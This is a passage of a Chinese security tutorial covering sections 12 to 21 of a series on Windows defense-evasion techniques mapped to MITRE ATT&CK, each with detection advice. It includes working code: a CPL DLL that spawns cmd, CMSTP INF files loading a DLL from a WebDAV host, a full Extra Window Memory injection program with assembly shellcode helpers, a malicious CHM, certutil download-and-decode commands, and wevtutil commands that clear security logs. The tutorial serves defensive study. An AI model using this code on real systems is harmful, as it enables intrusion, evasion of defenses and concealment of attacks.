> 2、修改系统配置或者杀软配置，阻止mshta.exe的执行，或者将该文件移除出应用程序白名单，以防止被潜在的攻击者滥用行为。

**参考链接**

> 1、 Att&ck：<https://attack.mitre.org/techniques/T1170/>
>
> 2、 Introduction to HTML Applications (HTAs):[https://docs.microsoft.com/en-> us/previous-> versions//ms536496(v=vs.85)?redirectedfrom=MSDN](https://docs.microsoft.com/en-> us/previous-versions/ms536496\(v=vs.85)?redirectedfrom=MSDN)

###  12、控制面板文件代码执行

**原理及代码介绍**

控制面板的每一项一般都会对应一个.CPL
文件,这些文件存于系统目录下,你可以指定控制面板中要显示的项目,也可以隐藏。当启动控制面板时，Windows\System 文件夹中的.cpl
文件会自动加载。

以“.CPL”扩展名结尾的文件其实是“.dll”文件，用IDA打开可以发现CPL文件都导出了一个CPLApplet函数。

![1.png](https://image.3001.net/images/20191226/15773313336140.png!small)

函数CPLApplet是控制面板应用程序的入口点，它被控制面板管理程序自动调用，并且是个回调函数，注意：CPL文件一定要把函数CPLApplet导出，这样控制面板才能找到程序的入口点。

当启动控制面板时，它会搜索Windows或System32或注册表的相应条目目录下的文件，并把以CPL作为扩展名的文件载入，它调用CPL文件的导出函数CPLApplet（），发送消息给该函数。所以，控制面板应用程序要处理控制面板发送过来的消息，即在函数CPLApplet中进行处理，该函数没有默认的行为。如果一个CPL文件中实现了多个控制面板程序，那么只会有一个CPLApplet函数，它负责所有的控制面板应用程序。

开启默认规则后会拦截exe和脚本的执行，并没有限制CPL文件，因此可以绕过Windows AppLocker的限制规则。当然也可以绕过一些应用程序白名单

Cpl文件按照dll文件的编写就行，如果只是简单的运行cmd，可以不导出函数CPLApplet。

    
    
    extern "C" __declspec(dllexport) LONG CPLApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2) {      return 0; } BOOL APIENTRY DllMain( HMODULE hModule,             DWORD ul_reason_for_call,             LPVOID lpReserved            ) {   switch (ul_reason_for_call)   {   case DLL_PROCESS_ATTACH:           WinExec("cmd", SW_SHOW);   case DLL_THREAD_ATTACH:   case DLL_THREAD_DETACH:   case DLL_PROCESS_DETACH:     break;   }   return TRUE; }

编译成功后，将dll后缀名改成cpl，并修改注册表项

    
    
    HKEY hKey; DWORD dwDisposition; char path [] = "C:\\testcpl”; RegCreateKeyExA(HKEY_CURRENT_USER,               "Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition); RegSetValueExA(hKey, “testcpl.cpl”, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))));

![2.png](https://image.3001.net/images/20191226/15773313476774.png!small)

在控制面板被阻止打开的情况下，可以使用以下位置作为启动控制面板的替代方法。

    
    
    · C:windowssystem32control.exe · AppDataRoamingMicrosoftWindowsStart MenuProgramsAccessoriesSystem ToolsControl Panel.lnk · shell:::{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0} · shell:::{26EE0668-A00A-44D7-9371-BEB064C98683} · shell:::{ED7BA470-8E54-465E-825C-99712043E01C} · My Control Panel.{ED7BA470-8E54-465E-825C-99712043E01C}

**运行效果图**

当运行控制面板时，cmd.exe自动启动。

![3.png](https://image.3001.net/images/20191226/15773313642483.png!small)

**检查及限制方案**

监视和分析与CPL文件关联的项的活动，查找系统上未注册和潜在恶意文件。

将控制面板项的存储和执行限制在受保护目录上，例如C:\Windows

**参考链接**

> <https://attack.mitre.org/techniques/T1196/>

###  13、CMSTP配置文件参数利用

**原理及代码介绍**

CMSTP.exe是用于安装Connection
Manager服务配置文件的命令行程序。程序接受INF配置文件作为参数。这项攻击手段的关键点就在于配置文件。攻击者可能会向CMSTP.exe提供受恶意命令感染的INF文件，以脚本（SCT）和DLL的形式执行任意代码。它是一个受信任的Microsoft二进制文件，位于以下两个Windows目录中：

    
    
    C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe

AppLocker默认规则允许在这些文件夹中执行二进制文件，因此我们可以用它来作为bypass的一种方法。使用这个二进制文件可以绕过AppLocker和UAC。因为传输的并不是二进制文件，所以也会绕过一些杀软的白名单。

配置文件可以通过安装启动CMAK（Connection Manager Administration
Kit）来创建，关于CMAK可以通过[Microsoft文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831675\(v=ws.11)?redirectedfrom=MSDN)进行了解。在这里就不具体演示获得INF文件的过程了，可以通过以下链接获得：
[INF文件](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf)。

INF文件的内容有很多项，我们想要利用INF文件，只需要保留一些重要的项，以下是简化的INF文件内容

    
    
    [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\test.dll [Strings] AppAct = "SOFTWARE\Microsoft\Connection Manager" ServiceName="Pentestlab" ShortSvcName="Pentestlab"

需要注意到的是INF文件的RegisterOCXSection需要包含恶意DLL文件的本地路径或远程执行的WebDAV位置。这样就能从本地或Webdav中加载DLL文件。

从WebDAV服务器实现加载dll需要修改下面内容：

    
    
    [RegisterOCXSection]  \10.10.10.10webdavAllTheThings.dll

命令行：cmstp.exe /s c:\cmstp.inf

当然，还可以将RegisterOCXSection 换成RunPreSetupCommandsSection，在此项下可以直接执行命令程序，例如：

    
    
    [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] c:\windows\system32\calc.exe taskkill /IM cmstp.exe /F [Strings] AppAct = "SOFTWARE\Microsoft\Connection Manager" ServiceName="CorpVPN" ShortSvcName="CorpVPN"

**运行效果图**

如下图所示，在命令行中执行cmstp 并加入相关参数cmstpdll.inf ,我们预设的dll
就运行在了cmstp进程中，此处或许可能被恶意代码所利用，用以逃避杀软白名单检测及进程检测等

![5.png](https://image.3001.net/images/20191226/15773314072395.png!small)

执行命令，弹出计算器：

![6.png](https://image.3001.net/images/20191226/15773314222753.png!small)

**检查及限制方案**

>
> 1.使用进程监视来检测和分析CMSTP.exe的执行和参数。将最近对CMSTP.exe的调用与已知的参数和已加载文件的历史进行比较，以确定异常和潜在的对抗性活动。
>
> 2\. Sysmon事件也可以用来识别CMSTP.exe的潜在威胁。

**参考链接**

> <https://attack.mitre.org/techniques/T1191/>
>
> <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-> server-2012-R2-and-2012/hh831675(v=ws.11)?redirectedfrom=MSDN>
>
> <https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-> uacbypass-inf>

###  14、额外窗口内存注入

**原理及代码介绍**

在创建窗口之前，基于图形Windows的进程必须注册一个Windows类，该类规定外观和行为。新窗口类的注册可以包括一个请求，请求将多达40个字节的额外窗口内存(EWM)附加到该类的每个实例的分配内存中。该EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口(API)函数来设置和获取其值。

虽然EWM很小，但它的大小足以存储32位指针，并且经常用于指向Windows过程。EWMI依赖注入到资源管理器托盘窗口内存中，并在恶意软件家族Gapz和PowerLoader中使用多次。然而，在EWM中没有太多的空间。为了规避这个限制，恶意软件将代码写入explorer.exe的共享段中，并使用SetWindowLong和SendNotifyMessage得到一个指向shellcode的函数指针，然后执行它。

当写入共享段时，恶意软件有两个选项。它能创建一个共享段自己映射到另一个进程（如explorer）中，或者打开一个已存在的共享段。前者有分配堆内存的开销，而且还要调用NtMapViewOfSection等API，因此后者更常用。在恶意代码将shellcode写入共享段后，使用GetWindowLong和SetWindowLong来访问并修改Shell_TrayWnd的额外的窗口内存。GetWindowLong是用于通过32位值作为偏移得到窗口类对象中额外窗口内存，同时使用SetWindowLong能改变指定偏移的值。通过完成这个，恶意代码能改变窗口类中的函数指针，将它指向共享段的shellcode。

和上述的技术一样，恶意软件需要触发写入的代码。有一些技术是通过调用类似CreateRemoteThread，SetThreadContext，QueueUserAPC这些API来实现的。与其他不同的是，这种技术是通过使用SendNotifyMessage或PostMessage来触发代码执行的。

一旦执行SendNotifyMessage或PostMessage，Shell_TrayWnd将接收到并将控制移交给SetWindowLong设置的地址。

主程序源代码如下：

    
    
    HANDLE g_hprocess = NULL; unsigned char shellcode[100] = { 0, }; DWORD shellcodeSize = sizeof(shellcode); PVOID mapshellocdeprocess() {      HANDLE hSection = NULL;      OBJECT_ATTRIBUTES hAttributes;      memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));      LARGE_INTEGER maxSize;      maxSize.HighPart = 0;      // 保存壳代码与指针      maxSize.LowPart = sizeof(LONG) * 2 + shellcodeSize;      NTSTATUS status = NULL;      if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)      {           printf("[ERROR] ZwCreateSection failed, status : %x\n", status);           return NULL;      }      PVOID sectionBaseAddress = NULL;      ULONG viewSize = 0;      SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE      // 映射      if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &ampsectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)      {           printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);           return NULL;      }      printf("Section BaseAddress: %p\n", sectionBaseAddress);      // 切换到映射      PVOID sectionBaseAddress2 = NULL;      if ((status = NtMapViewOfSection(hSection, g_hprocess, &ampsectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)      {           printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);           return NULL;      }      LPVOID shellcode_remote_ptr = sectionBaseAddress2;      LPVOID shellcode_local_ptr = sectionBaseAddress;      memcpy(shellcode_local_ptr, shellcode, shellcodeSize);      printf("Shellcode copied!\n");      LPVOID handles_remote_ptr = (BYTE*)shellcode_remote_ptr + shellcodeSize;      LPVOID handles_local_ptr = (BYTE*)shellcode_local_ptr + shellcodeSize;      PVOID buf_va = (BYTE*)handles_remote_ptr;      LONG hop1 = (LONG)buf_va + sizeof(LONG);      LONG shellc_va = (LONG)shellcode_remote_ptr;      memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(LONG));      memcpy((BYTE*)handles_local_ptr + sizeof(LONG), &shellc_va, sizeof(LONG));      //u nmap from the context of current process      ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);      ZwClose(hSection);      printf("Section mapped at address: %p\n", sectionBaseAddress2);      return shellcode_remote_ptr; } int main() {      // 查找Shell_TrayWnd 外壳类，主要是管理      HWND hWnd =           FindWindow(               L"Shell_TrayWnd",               NULL           );      if (hWnd == NULL)           return -1;      DWORD pid = 0;      LONG nwlong = 0;      nwlong = GetWindowThreadProcessId(hWnd, &pid);      // 打开Shell_TrayWnd      g_hprocess =           OpenProcess(               PROCESS_VM_OPERATION | PROCESS_VM_WRITE,               false,               pid           );      if (g_hprocess == NULL)           return 0;      // 映射shellcode      LPVOID remoteshellcodeptr = mapshellocdeprocess();      // 设置到额外的窗口内存中      SetWindowLong(           hWnd,           0,           /*参数三替换值shellcodeptr*/           (LONG)remoteshellcodeptr      );      // 调用窗口过程也就是发送执行shellcode      SendNotifyMessage(hWnd, WM_PAINT, 0, 0);      // 这里先sleep等待执行      Sleep(5000);      // 恢复原来得数据      SetWindowLong(hWnd, 0, nwlong);      SendNotifyMessage(hWnd, WM_PAINT, 0, 0);      CloseHandle(g_hprocess); }

Payload：

    
    
     LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam,           LPARAM lParam) {      if (uMsg != WM_CLOSE) return 0;      WinExec_t pWinExec;      DWORD   szWinExec[2],           szNotepad[3];      // WinExec      szWinExec[0] = 0x456E6957;      szWinExec[1] = 0x00636578;      // runs notepad      szNotepad[0] = *(DWORD*)"note";      szNotepad[1] = *(DWORD*)"pad\0";      pWinExec = (WinExec_t)puGetProcAddress(szWinExec);      if (pWinExec != NULL) {           pWinExec((LPSTR)szNotepad, SW_SHOW);      }      return 0; }

因为需要从OD中复制出来shellcode，放入字符串数组中运行。

所以模块基址的获取和函数的获取需要使用汇编自己获取。

    
    
    // ===================获取模块基址============================ DWORD puGetModule(const DWORD Hash) {     DWORD    nDllBase = 0;     __asm {         jmp            start         /*函数1：遍历PEB_LDR_DATA链表HASH加密*/     GetModulVA :         push        ebp;         mov            ebp, esp;         sub            esp, 0x20;         push        edx;         push        ebx;         push        edi;         push        esi;         mov            ecx, 8;         mov            eax, 0CCCCCCCCh;         lea            edi, dword ptr[ebp - 0x20];         rep stos    dword ptr es : [edi];         mov            esi, dword ptr fs : [0x30];         mov            esi, dword ptr[esi + 0x0C];         mov            esi, dword ptr[esi + 0x1C];     tag_Modul:         mov            dword ptr[ebp - 0x8], esi;    // 保存LDR_DATA_LIST_ENTRY         mov            ebx, dword ptr[esi + 0x20];    // DLL的名称指针(应该指向一个字符串)         mov            eax, dword ptr[ebp + 0x8];         push        eax;         push        ebx;                        // +0xC         call        HashModulVA;         test        eax, eax;         jnz            _ModulSucess;         mov            esi, dword ptr[ebp - 0x8];         mov            esi, [esi];                    // 遍历下一个         LOOP        tag_Modul     _ModulSucess :         mov            esi, dword ptr[ebp - 0x8];         mov            eax, dword ptr[esi + 0x8];         pop            esi;         pop            edi;         pop            ebx;         pop            edx;         mov            esp, ebp;         pop            ebp;         ret
    
    
    /*函数2：HASH解密算法（宽字符解密）*/ HashModulVA :     push        ebp;     mov            ebp, esp;     sub            esp, 0x04;     mov            dword ptr[ebp - 0x04], 0x00     push        ebx;     push        ecx;     push        edx;     push        esi;     // 获取字符串开始计算     mov            esi, [ebp + 0x8];     test        esi, esi;     jz            tag_failuers;     xor            ecx, ecx;     xor            eax, eax; tag_loops:     mov            al, [esi + ecx];        // 获取字节加密     test        al, al;                    // 0则退出     jz            tag_ends;     mov            ebx, [ebp - 0x04];     shl            ebx, 0x19;     mov            edx, [ebp - 0x04];     shr         edx, 0x07;     or ebx, edx;     add            ebx, eax;     mov[ebp - 0x4], ebx;     inc            ecx;     inc            ecx;     jmp            tag_loops; tag_ends:     mov            ebx, [ebp + 0x0C];        // 获取HASH     mov            edx, [ebp - 0x04];     xor            eax, eax;     cmp            ebx, edx;     jne            tag_failuers;     mov            eax, 1;     jmp            tag_funends; tag_failuers:     mov            eax, 0; tag_funends:     pop            esi;     pop            edx;     pop            ecx;     pop            ebx;     mov            esp, ebp;     pop            ebp;     ret            0x08 start:     /*主模块*/     pushad;     push        Hash;     call        GetModulVA;     add            esp, 0x4     mov            nDllBase, eax;     popad; } return nDllBase;
    
    
    } // ===================获取函数地址============================ DWORD puGetProcAddress(const DWORD dllvalues, const DWORD Hash) {     DWORD FunctionAddress = 0;     __asm {         jmp            start         // 自定义函数计算Hash且对比返回正确的函数     GetHashFunVA :         push        ebp;         mov            ebp, esp;         sub            esp, 0x30;         push        edx;         push        ebx;         push        esi;         push        edi;         lea            edi, dword ptr[ebp - 0x30];         mov            ecx, 12;         mov            eax, 0CCCCCCCCh;         rep    stos    dword ptr es : [edi];         // 以上开辟栈帧操作（Debug版本模式）         mov            eax, [ebp + 0x8];                // ☆ kernel32.dll(MZ)         mov            dword ptr[ebp - 0x8], eax;         mov            ebx, [ebp + 0x0c];                // ☆ GetProcAddress Hash值         mov            dword ptr[ebp - 0x0c], ebx;         // 获取PE头与RVA及ENT         mov            edi, [eax + 0x3C];                // e_lfanew         lea            edi, [edi + eax];                // e_lfanew + MZ = PE         mov            dword ptr[ebp - 0x10], edi;        // ☆ 保存PE（VA）         // 获取ENT         mov            edi, dword ptr[edi + 0x78];        // 获取导出表RVA         lea            edi, dword ptr[edi + eax];        // 导出表VA         mov[ebp - 0x14], edi;                        // ☆ 保存导出表VA         // 获取函数名称数量         mov            ebx, [edi + 0x18];         mov            dword ptr[ebp - 0x18], ebx;        // ☆ 保存函数名称数量         // 获取ENT         mov            ebx, [edi + 0x20];                // 获取ENT(RVA)         lea            ebx, [eax + ebx];                // 获取ENT(VA)         mov            dword ptr[ebp - 0x20], ebx;        // ☆ 保存ENT(VA)         // 遍历ENT 解密哈希值对比字符串         mov            edi, dword ptr[ebp - 0x18];         mov            ecx, edi;         xor            esi, esi;         mov            edi, dword ptr[ebp - 0x8];         jmp            _WHILE;             // 外层大循环     _WHILE :         mov            edx, dword ptr[ebp + 0x0c];        // HASH         push        edx;         mov            edx, dword ptr[ebx + esi * 4];    // 获取第一个函数名称的RVA         lea            edx, [edi + edx];                // 获取一个函数名称的VA地址         push        edx;                            // ENT表中第一个字符串地址         call        _STRCMP;         cmp            eax, 0;         jnz            _SUCESS;         inc            esi;         LOOP        _WHILE;         jmp            _ProgramEnd;             // 对比成功之后获取循环次数（下标）cx保存下标数     _SUCESS :         // 获取EOT导出序号表内容         mov            ecx, esi;         mov            ebx, dword ptr[ebp - 0x14];         mov            esi, dword ptr[ebx + 0x24];         mov            ebx, dword ptr[ebp - 0x8];         lea            esi, [esi + ebx];                // 获取EOT的VA         xor            edx, edx;         mov            dx, [esi + ecx * 2];            // 注意双字 获取序号         // 获取EAT地址表RVA         mov            esi, dword ptr[ebp - 0x14];        // Export VA         mov            esi, [esi + 0x1C];         mov            ebx, dword ptr[ebp - 0x8];         lea            esi, [esi + ebx];                // 获取EAT的VA                     mov            eax, [esi + edx * 4];            // 返回值eax（GetProcess地址）         lea            eax, [eax + ebx];         jmp            _ProgramEnd;
    
    
    _ProgramEnd:     pop            edi;     pop            esi;     pop            ebx;     pop            edx;     mov            esp, ebp;     pop            ebp;     ret            0x8;     // 循环对比HASH值 _STRCMP:     push        ebp;     mov            ebp, esp;     sub            esp, 0x04;     mov            dword ptr[ebp - 0x04], 0x00;     push        ebx;     push        ecx;     push        edx;     push        esi;     // 获取字符串开始计算     mov            esi, [ebp + 0x8];     xor            ecx, ecx;     xor            eax, eax; tag_loop:     mov            al, [esi + ecx];        // 获取字节加密     test        al, al;                    // 0则退出     jz            tag_end;     mov            ebx, [ebp - 0x04];     shl            ebx, 0x19;     mov            edx, [ebp - 0x04];     shr         edx, 0x07;     or ebx, edx;     add            ebx, eax;     mov[ebp - 0x4], ebx;     inc            ecx;     jmp            tag_loop; tag_end :     mov            ebx, [ebp + 0x0C];        // 获取HASH     mov            edx, [ebp - 0x04];     xor            eax, eax;     cmp            ebx, edx;     jne            tag_failuer;     mov            eax, 1;     jmp            tag_funend; tag_failuer:     mov            eax, 0; tag_funend:     pop            esi;     pop            edx;     pop            ecx;     pop            ebx;     mov            esp, ebp;     pop            ebp;     ret            0x08 start:     pushad;     push        Hash;                        // Hash加密的函数名称     push        dllvalues;                    // 模块基址.dll     call        GetHashFunVA;                // GetProcess     mov            FunctionAddress, eax;        // ☆ 保存地址     popad; } return FunctionAddress; }

**运行效果图**

当主程序执行时，记事本就会运行，并通过进程树发现，记事本作为explorer.exe的子进程在运行。

![25.png](https://image.3001.net/images/20191226/15773314678216.png!small)

**检查及限制方案**

> 监视操作EWM(如GetWindowLong和SetWindowLong)相关的API调用。

**参考链接**

> <https://attack.mitre.org/techniques/T1181/>

###  15、修改文件权限

 **原理及代码介绍**

文件和目录权限通常由文件或目录所有者指定的自主访问控制列表(DACL)管理。自主访问控制列表(DACL)是一个最普遍类型的访问控制列表(ACL)。在一个DACL(Discretionary
Access Control
List)中,指出了允许和拒绝某用户或用户组的存取控制列表。当一个进程需要访问安全对象时，系统就会检查DACL来决定进程的访问权。如果一个对象没有DACL,则说明任何人对这个对象都可以拥有完全的访问权限。

用户可以使用attrib.exe二进制文件修改特定文件的属性。简单地命令attrib +h filename，就是隐藏文件。

攻击者可以通过修改文件或目录的权限和属性以攻破DACL的设置。著名的WannaCry 就使用了attrib +h和icacls . /grant
Everyone:F /T /C /Q 隐藏其某些文件并授予所有用户完全访问控制权限

对ICacls详细参数可参考：

[ICacls] <https://baike.baidu.com/item/Icacls/2169532?fr=aladdin>  

对attrib详细参数可参考：

[attrib] <https://jingyan.baidu.com/article/2c8c281d7f7f610008252af8.html>  

从这些功能上看，通过修改文件属性和权限，可以针对绕过文件监视，文件系统访问控制。

**运行效果图**

ICacls查看目录和文件的权限

![17.png](https://image.3001.net/images/20191226/15773316302527.png!small)

隐藏文件

![18.png](https://image.3001.net/images/20191226/15773316392926.png!small)

**检查及限制方案**

> 1.监视和调查修改DACL和文件/目录所有权的操作，例如icacls的使用。
>
> 2.考虑对二进制或配置文件的目录权限更改进行审核。
>
> 3.修改DACL时使用Windows安全日志记录事件。

 **参考链接**

> <https://attack.mitre.org/techniques/T1222/>
>
> <https://baike.baidu.com/item/Icacls/2169532?fr=aladdin>
>
> <https://jingyan.baidu.com/article/2c8c281d7f7f610008252af8.html>

###  16、CHM文件隐藏代码执行

 **原理及代码介绍**

CHM文件是一种“已编译的HTML文件”，是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。而该类型的文件是可以用Windows自带的hh.exe文件来打开的。CHM文件可以包含各种文件，如HTML文件，图像以及与脚本相关的编程语言。攻击者可能会滥用此技术来隐藏恶意代码，传输包含代码的自定义CHM文件。并且可以绕过一些未升级的系统上的应用程序白名单。Silence组织就曾使用恶意CHM文档攻击俄罗斯银行。

编写CHM文件需要准备一个HTML文件，如下：

    
    
    <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">   <title>title</title>     <script type="text/javascript">     var objShell           var objShell= new ActiveXObject("WScript.Shell")           var iReturnCode=objShell.Run("calc.exe",0,true)   </script> </head> <body> </body> </html>

了解HTML文件格式可以访问：[HTML文件格式](https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6/7176861?fr=aladdin)

众所周知，HTML文件不能执行cmd命令，编译成CHM文件就可以完美执行。

CHM文件的制作工具比较多，本次介绍一款工具 easy
chm，可以去[官网](http://www.etextwizard.com/easychm.html)下载。

打开easy chm后点击新建

![11.png](https://image.3001.net/images/20191226/15773317088827.png!small)

将HTML文件单独放在一个文件夹中，浏览的路径是一个文件夹路径

![12.png](https://image.3001.net/images/20191226/15773316935794.png!small)

确定之后，点击编译即可

![13.png](https://image.3001.net/images/20191226/15773317241874.png!small)

**运行效果图**

双击运行生成的CHM文件，弹出计算器

![14.png](https://image.3001.net/images/20191226/15773317422011.png!small)

**检查及限制方案**

> 1.监视和分析hh.exe的执行和参数。将最近对hh.exe的调用与已知的参数的历史进行比较，以确定异常和潜在的对抗性活动。
>
> 2\. 监视CHM文件的存在和使用。

 **参考链接**

> <https://attack.mitre.org/techniques/T1223/>
>
>
> [https://baike.baidu.com/item/HTML文件/7176861?fr=aladdin](https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6/7176861?fr=aladdin)
>
> <http://www.etextwizard.com/easychm.html>

###  17、本机程序编译代码执行

 **原理及代码介绍**

当进行数据的传输时，Windows可能会对可执行文件进行分析和检查。如果将文件作为未编译代码传递，这些代码的行为就会难以被发现和分析。当然这些代码需要编译后执行，通常是通过本机的实用工具（如csc.exe）进行编译。

csc.exe是微软.NET Framework
中的C#语言编译器，在环境变量里加入csc.exe的路径：C:\Windows\Microsoft.NET\Framework\v4.0.30319（注意,路径和版本号会因为你的安装和下载的不同而不同,自己到安装目录下看看）。

用记事本编写源代码：

    
    
    using System; using System.Windows.Forms; class TestApp {   public static void Main()   {   MessageBox.Show("Hello!");   } }

保存为.cs文件，在cmd命令行中执行命令：csc /reference:System.Windows.Forms.dll TestApp.cs

即可编译成TestApp.exe。

关于csc.exe详细命令参数可参考：[csc.exe命令](https://baike.baidu.com/item/csc.exe/9323691?fr=aladdin)

MinGW(Minimalist GNU For
Windows)是个精简的Windows平台C/C++、ADA及Fortran编译器。[下载地址](http://www.mingw.org/)。

安装完成之后，配置环境变量，可以编译.c文件。

命令：gcc test.c -o test

这种技术可以绕过基于签名的检测，白名单等。

 **运行效果图**

cse.exe

编译完成并生成exe文件。

![7.png](https://image.3001.net/images/20191226/15773318202435.png!small)![8.png](https://image.3001.net/images/20191226/15773318268709.png!small)

MinGW:

命令行编译完成，生成exe文件

![9.png](https://image.3001.net/images/20191226/15773318515071.png!small)![10.png](https://image.3001.net/images/20191226/15773318519757.png!small)

**检查及限制方案**

> 1\. 监视常用编译器(如csc.exe)的执行文件路径和命令行参数，并与其他可疑行为相关联。
>
> 2\. 寻找非本地二进制格式和跨平台编译器和执行框架，如Mono，并确定它们在系统上是否有合法的用途。

 **参考链接**

> <https://attack.mitre.org/techniques/T1500/>
>
> <https://baike.baidu.com/item/csc.exe/9323691?fr=aladdin>
>
> <http://www.mingw.org/>

###  18、间接命令执行

 **原理及代码介绍**

在Windows系统中可以使用各种Windows实用程序来执行命令，而不需要调用CMD。攻击者可能会滥用这些特征来绕过一些防御机制，如应用程序白名单等。

使用 Forfiles 可以通过不直接调用CMD，来隐藏命令执行。

Forfiles是一款windows平台的软件工具，其中选择文件并运行一个命令来操作文件。文件选择标准包括名称和上次修改日期。命令说明符支持一些特殊的语法选项。它可以直接在命令行中使用，也可以在批处理文件或其他脚本中使用。forfiles命令最初作为加载项提供在Windows
NT 资源工具包中。它成为Windows Vista的标准实用程序，作为新管理功能的一部分。

具体Forfiles使用参数参考：

[Forfiles] [https://jingyan.baidu.com/article/495ba8419d37ff38b20ede48.html
](https://jingyan.baidu.com/article/495ba8419d37ff38b20ede48.html)  

**运行效果图**

运行Forfiles

![20.png](https://image.3001.net/images/20191226/15773319203644.png!small)

**检查及限制方案**

> 监视和分析来自基于主机的检测机制(如Sysmon)的日志，查看包含或由调用程序，命令，文件，生成子进程，网络连接相关的参数的进程创建等事件。

 **参考链接**

> <https://attack.mitre.org/techniques/T1202/>
>
> <https://jingyan.baidu.com/article/495ba8419d37ff38b20ede48.html>

###  19、解码文件并执行

 **原理及代码介绍**

攻击者可以混淆文件或信息，从而无法分析恶意代码的行为和信息。混淆的方法有很多，比如最简单的异或和其它的加密算法。下面介绍一种恶意软件使用过的方法。

Windows有一个名为CertUtil的内置程序，可用于在Windows中管理证书，使用此程序可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。

攻击者可以利用certutil.exe把二进制文件（包括各种文件）经过base64编码为文本，这样可以将可执行文件隐藏在文件中，使恶意代码样本看起来像是无害的文本文件。

先将程序编码为文本：

    
    
    certutil -encode hello.exe hello.txt

下载文件到本地

    
    
    certutil -urlcache -split -f [URL] hello.txt

将文本解码为程序

    
    
    certutil -decode hello.txt hello.exe

也可以将程序编码为批处理文件（bat），在文件头部添加几行批处理代码

    
    
    @echo off` `certutil -decode "%~f0" hello.exe` `start hello.exe` `exit /b 1

像这种编码混淆文件的方法可以绕过基于签名的检测，网络入侵检测等，较多的恶意代码样本使用了此技术。

 **运行效果图**

执行完encode后生成的txt文件和bat文件内容

![21.png](https://image.3001.net/images/20191226/15773319616573.png!small)

执行decode解码为exe文件，或直接执行bat脚本文件，代码顺利执行

![22.png](https://image.3001.net/images/20191226/15773319696175.png!small)

**检查及限制方案**

> 执行进程和命令行监视，以检测与脚本和系统实用程序相关的潜在恶意行为。

 **参考链接**

> <https://attack.mitre.org/techniques/T1140/>

###  20、入侵痕迹清除

 **原理及代码介绍**

在分析恶意代码的时候，大家通常都会看到很多删除文件的操作。通过删除文件，攻击者可以清除入侵过程中的痕迹，防止留下证据被防御者找到。删除文件的方法有很多，大多数是用一些库函数，API,system命令等等。具体代码如下：

    
    
    int main() {   string dirName = "D:\\test";    bool  flag = RemoveDirectory(dirName.c_str());`   return 0;  }  int main() {     string path = "c:\\test.chm";     rmdir(path.c_str());     return 0; } int main() {     string command;     command = "rd /s /q c:\\test ";     system(command.c_str()); } int main() {     string command;     command = "del  /F /Q C:\test.txt ";     system(command.c_str()); }

不过大家都知道，在Windows下删除文件其实不是真的删除， 只是把那个文件的某个属性从0标识成1，你看不见而已。这也是为什么被删除的数据，可以恢复的道理。
所以也有很多恶意代码使用删除文件工具，进行安全删除。如SDelete，它安全地删除没有任何特殊属性的文件相对而言简单而直接：安全删除程序使用安全删除模式简单地覆盖文件。较为复杂的是安全地删除
Windows NT/2K 压缩、加密和稀疏文件，以及安全地清理磁盘可用空间。 感兴趣的可以参考：

除了删除文件，一般还会清除日志Windows事件日志。Windows事件日志是计算机警报和通知的记录。Microsoft将事件定义为“系统或程序中需要通知用户或添加到日志中的任何重要事件”。事件有三个系统定义的来源：系统、应用程序和安全。执行与帐户管理、帐户登录和目录服务访问等相关的操作的对手可以选择清除事件以隐藏其活动。

程序命令执行清除事件日志：

    
    
         wevtutil cl system     wevtutil cl application     wevtutil cl security

 **运行效果图**

运行SDelete如图所示

![16.png](https://image.3001.net/images/20191226/15773320059701.png!small)

清除系统日志

![19.png](https://image.3001.net/images/20191226/15773320166628.png!small)

**检查及限制方案**

> 1.在环境中检测与命令行函数（如 DEL，第三方实用程序或工具 ）相关的不常见的事件。
>
> 2.监视执行删除功能可能会导致的恶意活动。
>
> 3.监视已知的删除工具和安全删除工具 。
>
> 4.使用文件系统监视文件的不当删除或修改。例如，删除Windows事件日志。

 **参考链接**

> <https://attack.mitre.org/techniques/T1107/>
>
> <https://attack.mitre.org/techniques/T1070/>
>
> <https://docs.microsoft.com/zh-cn/sysinternals/downloads/sdelete>

###  21、文件加壳

 **原理及代码介绍**

软件打包指的是对可执行文件进行压缩或加密。打包可执行文件会更改文件签名，以避免基于签名的检测。通常我们称软件打包为加壳。

